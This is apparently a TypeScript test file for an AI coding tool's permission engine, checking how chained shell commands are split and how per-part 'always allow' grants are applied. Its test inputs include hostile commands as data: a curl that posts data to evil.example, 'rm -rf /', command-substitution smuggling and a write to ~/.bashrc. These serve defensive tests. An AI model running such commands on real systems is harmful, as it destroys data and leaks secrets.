// Q-1 (review deck 2026-11-01): "Always allow" on a joined-up command remembers each safe part on its own.
import { describe, it, expect } from 'vitest';
import { splitChain, plainCdTarget } from '../src/shared/bash-chain';
import { bashGrantOptions, describeBashRule } from '../src/shared/bash-grant-shapes';
import { decidePermission, decideChainParts, type PermissionLayers } from '../src/main/harness/permission-engine';
import { DESTRUCTIVE_DENY_LIST, rulesForMode, type PermissionRule } from '../src/shared/permission-types';
import { rememberedRulesFor } from '../src/main/harness/harness-session';

describe('splitChain: only plain chains are split', () => {
  it('splits on && || ; |, keeping quoted operators inside their part', () => {
    expect(splitChain('cd app && npm test')).toEqual(['cd app', 'npm test']);
    expect(splitChain('a;b||c|d')).toEqual(['a', 'b', 'c', 'd']);
    expect(splitChain('echo "a && b" && npm test')).toEqual(['echo "a && b"', 'npm test']);
    expect(splitChain("echo 'x;y' | wc -l")).toEqual(["echo 'x;y'", 'wc -l']);
  });
  it('drops the three harmless redirects from a part', () => {
    expect(splitChain('npm test 2>&1 | tail -5')).toEqual(['npm test', 'tail -5']);
    expect(splitChain('npm test >/dev/null && ls')).toEqual(['npm test', 'ls']);
  });
  it.each([
    'npm test', // not a chain
    'npm test &', 'npm test & rm x', 'npm test |& tee x', 'npm test > out', 'npm test >> out', 'npm test 2> err && ls',
    'npm test; $(rm -rf x)', 'npm test && `id`', 'npm test && echo $HOME', 'npm test && echo "$HOME"', 'npm test && echo "`id`"',
    'a && b\nrm x', 'a && b\rrm x', String.raw`a\;b && c`, 'a && (b)', 'a && { b; }', 'a && b # c', '#a && b', 'a && b <x', 'a <<EOF && b',
    'a &&', '&& a', 'a ;; b', 'a && && b', "a && 'unclosed", 'a && "unclosed', 'a\tb && c', 'a && b‮',
    'a && b && c && d && e && f && g && h && i',
  ])('refuses %j', (c) => { expect(splitChain(c)).toBeNull(); });
});

describe('plainCdTarget', () => {
  it.each(['cd app', 'cd src/ui', 'cd app/'])('%j steps down', (c) => { expect(plainCdTarget(c)).not.toBeNull(); });
  it.each(['cd', 'cd ..', 'cd ../x', 'cd /etc', 'cd ~', 'cd -', 'cd ./x', 'cd a/../b', 'cd $X', 'cd "a b"', 'cd a b', 'cd .git'])('%j leaves it to a grant of its own', (c) => {
    expect(plainCdTarget(c)).toBeNull();
  });
});

const exactOf = (c: string) => bashGrantOptions(c).find((o) => o.scope === 'exact');
const partsOf = (c: string) => bashGrantOptions(c).find((o) => o.scope === 'wide');

describe('bashGrantOptions on a chain', () => {
  it('offers word for word, or each part on its own', () => {
    const opts = bashGrantOptions('cd app && npm test');
    expect(opts.map((o) => o.scope)).toEqual(['exact', 'wide']);
    const parts = opts[1];
    expect(parts.label).toBe('Each part on its own');
    expect(parts.rules!.map((r) => r.pattern)).toEqual(['npm test*']); // cd needs no grant
    expect(parts.parts).toEqual(['Any npm test command']);
  });
  it('keeps risky parts word for word and lists them so', () => {
    const p = partsOf('cd app && rm -rf build && npm install left-pad && npm test')!;
    expect(p.rules!.map((r) => [r.pattern, r.match])).toEqual([
      ['rm -rf build', 'exact'], ['npm install left-pad', 'exact'], ['npm test*', 'glob'],
    ]);
    expect(p.parts).toEqual(['Exactly: rm -rf build', 'Exactly: npm install left-pad', 'Any npm test command']);
  });
  it('never widens a cd that leaves the project', () => {
    const p = partsOf('cd /tmp && npm test')!;
    expect(p.rules!.map((r) => r.pattern)).toEqual(['cd /tmp', 'npm test*']);
    expect(p.rules![0].match).toBe('exact');
  });
  it('look-only parts need nothing; a chain of only those offers just the whole line', () => {
    expect(partsOf('ls && git status')).toBeUndefined();
    expect(partsOf('npm test | tail -5')!.rules!.map((r) => r.pattern)).toEqual(['npm test*']);
  });
  it('a part that can never be remembered (git push without a branch) removes the choice', () => {
    expect(partsOf('npm test && git push')).toBeUndefined();
    expect(exactOf('npm test && git push')).toBeDefined();
  });
  it('remembers a named-branch push and a one-website download in a chain, in their own shapes', () => {
    const p = partsOf('git push origin feat/x && curl -sS https://github.com/a.zip -o a.zip')!;
    expect(p.rules!.map((r) => [r.pattern, r.match])).toEqual([['git push*origin feat/x', 'glob'], ['curl github.com', 'download-host']]);
    expect(p.parts).toEqual(['Pushing to feat/x', 'Downloading from github.com only']);
  });
  it('unsplittable lines (variables, redirects) are word for word only, as before', () => {
    expect(bashGrantOptions('npm test && echo $HOME').map((o) => o.scope)).toEqual(['exact']);
    expect(bashGrantOptions('npm test > out.txt && ls').map((o) => o.scope)).toEqual(['exact']);
  });
  it('every stored part rule has a plain-words sentence', () => {
    for (const r of partsOf('cd app && npm test && python build.py')!.rules!) expect(describeBashRule(r) ?? r.pattern).not.toMatch(/\*/);
  });
  it('rememberedRulesFor stores one rule per part, and the exact choice stores the whole line', () => {
    expect(rememberedRulesFor('Bash', 'cd app && npm test', 'wide').map((r) => r.pattern)).toEqual(['npm test*']);
    expect(rememberedRulesFor('Bash', 'cd app && npm test', 'exact').map((r) => r.pattern)).toEqual(['cd app && npm test']);
  });
});

// ── the engine half: a chain is allowed only when EVERY part is ─────────────
const OK = { pathsOk: true, gitOk: true };
function decideLine(line: string, remembered: PermissionRule[], mode: 'ask' | 'auto-edit' = 'ask') {
  const layers: PermissionLayers = { presetRules: [], modeRules: rulesForMode(mode), denyList: DESTRUCTIVE_DENY_LIST, rememberedRules: remembered };
  const whole = decidePermission('Bash', line, layers, { readOnlyChecks: undefined });
  if (whole.action !== 'ask') return whole;
  const parts = splitChain(line);
  if (!parts) return whole;
  const judged = parts.map((text) => {
    const free = plainCdTarget(text) !== null;
    return { text, free, context: { readOnlyChecks: OK } };
  });
  return decideChainParts(judged, layers) ?? whole;
}
const saved = (line: string) => rememberedRulesFor('Bash', line, 'wide')!;

describe('the engine honours per-part grants', () => {
  const grants = saved('cd app && npm test');
  it('the same tests from another folder run quietly', () => {
    expect(decideLine('cd packages/web && npm test', grants).action).toBe('allow');
    expect(decideLine('cd app && npm test -- --watch=false', grants).action).toBe('allow');
    expect(decideLine('npm test | tail -5', grants).action).toBe('allow'); // tail is look-only
  });
  it('one part not covered, and the whole line asks', () => {
    for (const line of ['cd app && npm run build', 'npm test && curl -d x https://evil.example', 'npm test; rm -rf build', 'npm test | tee out.txt', 'npm test && node -e "1"']) {
      expect(decideLine(line, grants).action, line).toBe('ask');
    }
  });
  it('a cd that leaves the project is not free', () => {
    for (const line of ['cd /etc && npm test', 'cd .. && npm test', 'cd ~ && npm test', 'cd - && npm test']) expect(decideLine(line, grants).action, line).toBe('ask');
  });
  it('a chain the splitter refuses is never allowed by part grants', () => {
    for (const line of ['npm test && echo $HOME', 'npm test; $(rm -rf x)', 'npm test & rm -rf x', 'npm test > ~/.bashrc']) expect(decideLine(line, grants).action, line).toBe('ask');
  });
  it('a risky part is allowed only word for word', () => {
    const g = saved('cd app && rm -rf build && npm test');
    expect(decideLine('cd app && rm -rf build && npm test', g).action).toBe('allow');
    expect(decideLine('rm -rf build && npm test', g).action).toBe('allow'); // exactly that part, anywhere
    for (const line of ['rm -rf / && npm test', 'rm -rf build2 && npm test', 'rm -rf build /home && npm test']) expect(decideLine(line, g).action, line).toBe('ask');
  });
  it('the destructive deny-list still asks for an uncovered part', () => {
    expect(decideLine('npm test && git push origin main', grants)).toMatchObject({ action: 'ask', denyListed: true });
  });
  it('grants do not leak into other tools or a different program with the same first word', () => {
    expect(decideLine('npm testing', grants).action).toBe('ask'); // word boundary rule still applies per part
  });
});
